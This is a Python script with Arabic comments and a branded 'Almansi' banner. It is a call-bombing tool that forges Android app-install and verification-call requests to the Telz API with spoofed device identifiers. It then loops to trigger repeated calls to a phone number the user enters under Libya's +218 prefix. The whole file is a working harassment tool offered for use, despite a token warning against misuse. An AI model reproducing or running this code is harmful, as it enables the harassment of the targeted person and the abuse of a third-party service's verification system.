#ممنوع تغير المصدر 
#مــافــيــا 

import pyfiglet
from termcolor import colored
import requests
import json
import random
import string
import time
import uuid

def generate_unique_ids():
    """توليد معرفات فريدة للتثبيت."""
    timestamp = int(time.time() * 1000)
    random_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
    unique_uuid = uuid.uuid4()
    return timestamp, random_id, unique_uuid

def send_install_request(url, headers, payload):
    """إرسال طلب التثبيت."""
    try:
        response = requests.post(url, data=payload, headers=headers)
        if response.ok and "ok" in response.text:
            return True
        else:
            print(f"Install request failed: {response.json().get('status', 'Unknown error')}")
            return False
    except Exception as e:
        print(f"Error during install request: {e}")
        return False

def send_auth_call_request(url, headers, payload):
    """إرسال طلب المكالمة."""
    try:
        response = requests.post(url, data=payload, headers=headers)
        if response.ok and "ok" in response.text:
            return True
        else:
            print(f"Auth call request failed: {response.json().get('status', 'Unknown error')}")
            return False
    except Exception as e:
        print(f"Error during auth call request: {e}")
        return False

if __name__ == "__main__":
    # Almansi 
    ascii_art = pyfiglet.figlet_format("『𝔸𝕃𝕄𝔸ℕ𝕊𝕀』")
    colored_art = colored(ascii_art, "red", attrs=["bold"])  # كلمة Almansi باللون الأحمر
    print(colored_art)

    # النصوص المرافقة
    print(colored("فكر قبل ما تستخدمه في الغلط كما تدين تدان", "yellow", attrs=["bold"]))
    print(colored("𓄂Almansi𖢳 ", "cyan", attrs=["bold", "underline"]))
    print()

    # إدخال الرقم وعدد المحاولات
    number = input(colored("الرقم من غير رمز الدوله: ", "green", attrs=["bold"]))
    repeat_count = int(input(colored("عدد المكالمات: ", "green", attrs=["bold"])))

    # إعداد المعرفات الفريدة
    foxx, fox, foxer = generate_unique_ids()

    # عنوان واجهة التثبيت
    install_url = "https://api.telz.com/app/install"
    auth_call_url = "https://api.telz.com/app/auth_call"

    # إعداد ترويسة الطلب
    headers = {
        'User-Agent': "Telz-Android/17.5.17",
        'Content-Type': "application/json"
    }

    # إعداد حمولة التثبيت
    payload_install = json.dumps({
        "android_id": fox,
        "app_version": "17.5.17",
        "event": "install",
        "google_exists": "yes",
        "os": "android",
        "os_version": "9",
        "play_market": True,
        "ts": foxx,
        "uuid": str(foxer)
    })

    for i in range(repeat_count):
        if send_install_request(install_url, headers, payload_install):
            # إذا نجح التثبيت، أرسل طلب المكالمة
            payload_auth_call = json.dumps({
                "android_id": fox,
                "app_version": "17.5.17",
                "attempt": "0",
                "event": "auth_call",
                "lang": "ar",
                "os": "android",
                "os_version": "9",
                "phone": f"+218{number}",
                "ts": foxx,
                "uuid": str(foxer)
            })

            if send_auth_call_request(auth_call_url, headers, payload_auth_call):
                print(colored(f"Done sending call {i + 1}/{repeat_count}", "green"))
            else:
                print(colored(f"Failed attempt {i + 1}/{repeat_count}, try again after 5 minutes.", "red"))
        else:
            print(colored(f"Install request failed on attempt {i + 1}/{repeat_count}.", "red"))
        
        time.sleep(2)   
        time.sleep(2)
        
